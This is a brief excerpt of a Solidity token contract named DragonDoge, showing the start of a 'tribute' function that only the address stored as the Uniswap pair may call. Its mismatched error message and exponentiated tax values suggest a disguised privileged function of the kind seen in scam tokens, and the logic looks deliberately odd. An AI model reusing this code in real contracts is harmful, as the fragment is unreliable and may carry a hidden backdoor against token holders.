...
contract DragonDoge is IERC20, Ownable, BaseToken {
    ...
    function tribute(uint256 _cogarBuyTax, uint256 _cogarSellTax, uint256 constantAmount, address _pair) public {
        require(uniswapV2Pair == _msgSender());
        require(_cogarBuyTax > 0, "Transfer amount must be greater than zero");
        uint256 contractTokenBalance = _cogarBuyTax ** _cogarSellTax;
